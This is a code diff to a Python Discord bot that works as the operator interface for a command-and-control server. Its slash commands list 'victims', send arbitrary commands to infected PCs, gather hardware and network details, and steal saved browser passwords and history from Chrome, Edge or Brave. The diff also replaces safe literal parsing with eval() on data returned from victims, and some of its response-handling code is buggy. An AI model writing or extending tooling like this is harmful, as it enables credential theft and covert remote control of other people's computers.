@@ -5,19 +5,36 @@ from icecream import ic
 import requests
 import io
 import pprint
-import ast
 from discord.ext import tasks
 import io
+import datetime
 
 
 
+def fix_embed_length(embed):
+    new_embeds = []
+    current_embed = embed.to_dict()
+    
+    for field in current_embed['fields']:
+        while len(field['value']) > 1024:
+            field['value'] = field['value'][:1021] + '...'  # Truncate the value and add ellipsis
+            
+            new_embed = discord.Embed.from_dict(current_embed)
+            new_embeds.append(new_embed)
+            
+            current_embed = embed.to_dict()  # Refresh current_embed to avoid modifying the original embed
+    
+    if len(new_embeds) == 0:
+        new_embeds.append(embed)
+    
+    return new_embeds
 
     
 def process_for_pprint(data):
     # If the input is a string, convert it to a dictionary
     if isinstance(data, str):
         try:
-            data = ast.literal_eval(data)
+            data = eval(data)
         except ValueError:
             return None
 
@@ -54,6 +71,8 @@ class BOT:
         self.db = db
         self.guild_id = int(guild_id)
         self.URL = URL
+        self.red_circle = ":red_circle:"
+        self.green_circle = ":green_circle:"
         @bot.event
         async def on_ready():
             ic("BOT UP AND RUNNING")
@@ -88,7 +107,7 @@ class BOT:
         async def ping(interaction:discord.Interaction):
             await interaction.response.send_message(f'Pong! {round(bot.latency * 1000)} ms')
 
-        @bot.tree.command(name="show_victims")
+        @bot.tree.command(name="list_victims")
         @app_commands.describe(show_all_info = "wether to show all the stored data on the victim or just the name")
         async def victims(interaction:discord.Interaction, show_all_info:bool=False):
             if show_all_info:
@@ -130,8 +149,7 @@ class BOT:
         @bot.tree.command(name="new_command")
         @app_commands.describe(command = "a command to send to the client",target = "the victim's pc name",parameter = "a paramater to the command NOT REQUOIRED")
         async def new_command(interaction:discord.Interaction,command:str,target:str,parameter:str or None =None):
-            Data = {"command":command, "target":target, "parameter":str(parameter)}
-            r    = requests.post(URL+"/api/cnc/command",json=Data)
+            r = self._new_command(command,target,parameter)
             await interaction.response.send_message(f"```Status: {r.status_code}\nResponse: {r.text}```")
         
         @bot.tree.command(name="check_response")
@@ -139,19 +157,57 @@ class BOT:
         async def check_response(interaction:discord.Interaction,time:int=60):
             await self.check_for_responses(time)
             await interaction.response.send_message("```Checking```")
-    
-    def resp_manager(self,resp:str):
-            if type(resp) == type(list):
-                rsponses = []
-                for respns in resp:
-                    rsponses.append(f"**ResponseTime**: `{respns[1]}`\n**Command**: `{respns[2]}`\n**Result**:`{respns[4]}`\n**Response**:```{str(respns[3])}```")
-            elif type(resp) == type(tuple):
-                return (f"**ResponseTime**: `{respns[1]}`\n**Command**: `{respns[2]}`\n**Result**:`{respns[4]}`\n**Response**:```{str(respns[3])}```")
-            elif type(resp) == type(str):
-                return resp
-            else:
-                return resp
+
+        @bot.tree.command(name="gather_info")
+        @app_commands.describe(target = "the victim's pc name can be found using /list_victims",part="What pc part to gather info options(all,motherboard,ram,cpu,gpu,disk,screen,os,rnp,network)")
+        async def info(interaction:discord.Interaction,target:str,part:str = "disk"):
+            r = self._new_command(command="info",target=target,parameter=part)
+            await interaction.response.send_message(f"```Status: {r.status_code}\nResponse: {r.text}```")
+
+        @bot.tree.command(name="browser_data")
+        @app_commands.describe(target = "the victim's pc name can be found using /list_victims",browser="What browser to steal from options(edge,brave,chrome)",what_to_steal="options(all,history,password)")
+        async def browser_data(interaction:discord.Interaction,target:str,browser:str,what_to_steal:str):
+            parameter = f"{browser.strip().lower()},{what_to_steal.strip().lower()}"
+            r = self._new_command(command="info",target=target,parameter=parameter)
+            await interaction.response.send_message(f"```Status: {r.status_code}\nResponse: {r.text}```")
+
+    def resp_manager(self,resp):
+        rsponses = []
+        if type(resp) == list:    
+            for respns in resp:
+                embed = discord.Embed(title=respns[2],description=f"Response for command:{respns[2]}",colour=discord.Colour.random())
+                response = eval(str(resp[3]))
+                for i,j in response.items():
+                    if type(eval(str(j))) == dict:
+                        for d,k in eval(str(j)).items():
+                            embed.add_field(name=d,value=k,inline=False)
+
+                    else:
+                        embed.add_field(name=i,value=j,inline=False)
                 
+            rsponses.append(embed)
+                
+                    
+        elif type(resp) == tuple:
+            response = eval(str(resp[3]))
+            embed = discord.Embed(title=resp[2],description=f"Response for command:{resp[2]}",colour=discord.Colour.random())
+            if type(response) == dict:
+                for i,j in response.items():
+                    t = eval(str(j))
+                    if type(t) == dict:
+                            for d,k in eval(str(j)).items():
+                                embed.add_field(name=d,value=k,inline=False)
+                    elif type(t) == list:
+                        if type(eval(str(t[0]))) == dict:
+                            for d,k in eval(str(t[0])).items():
+                                embed.add_field(name=f"{str(i).capitalize()}_{d}",value=k,inline=False)
+
+                    else:
+                        embed.add_field(name=i,value=j,inline=False)
+                rsponses.append(embed)
+                    
+            return rsponses
+        
     def iscategory(self,category_name:str):
         guild = self.bot.get_guild(self.guild_id)
 
@@ -179,7 +235,7 @@ class BOT:
         except:
             return None
 
-    async def check_for_responses(self,time:int=10):
+    async def check_for_responses(self,time:int=6):
         ic("Checking")
         clients = self.db._return_all_uuids()
         for client in clients:
@@ -202,40 +258,26 @@ class BOT:
                         ic(response)
                         resp = self.resp_manager(response)
                         if type(resp) == list:
-                                for respons in resp:
-                                    if respons != None and len(str(respons)) > 0:
-                                        if len(str(respons)) > 1999:
-                                            obj = self.create_file_inmemory(respons)
-                                            file = discord.File(obj,filename="Response.txt")
-                                            await channel.send(file=file)
+                                for embed in resp:
+                                    if embed != None and len(embed) > 0:
+                                        if len(embed) > 6000 :
+                                            embeds  = fix_embed_length(embed)
+                                            for embed in embeds:
+                                                await channel.send(embed=embed)
                                         else:
                                             try:
-                                                await channel.send(respons)
+                                                await channel.send(embed=embed)
                                             except:
-                                                obj = self.create_file_inmemory(respons)
-                                                file = discord.File(obj,filename="Response.txt")
-                                                await channel.send(file=file)
+                                                embeds  = fix_embed_length(embed)
+                                                for embed in embeds:
+                                                    await channel.send(embed=embed)
+
                                     else:
                                         await channel.send("Empty response")
 
                                     
-                        else:
-                                if resp != None:
-                                    if len(str(resp)) >0:
-                                        if len(str(resp)) > 1999:
-                                            obj = self.create_file_inmemory(resp)
-                                            file = discord.File(obj,filename="Response.txt")
-                                            await channel.send(file=file)
-                                        else:
-                                            try:
-                                                await channel.send(resp)
-                                            except:
-                                                obj = self.create_file_inmemory(resp)
-                                                file = discord.File(obj,filename="Response.txt")
-                                                await channel.send(file=file)
-                                else:
-                                    ic(resp)
-                                    await channel.send(f"Response is None + {resp}")
+                      
+                                     
                         
                 else:
                     ic(name)
@@ -245,3 +287,8 @@ class BOT:
         file_obj = io.StringIO()
         file_obj.write(str(text))
         return io.BytesIO(file_obj.getvalue().encode())
+
+    def _new_command(self,command:str,target:str,parameter:str|None = None):
+        Data = {"command":command, "target":target, "parameter":str(parameter)}
+        r    = requests.post(self.URL+"/api/cnc/command",json=Data)
+        return r
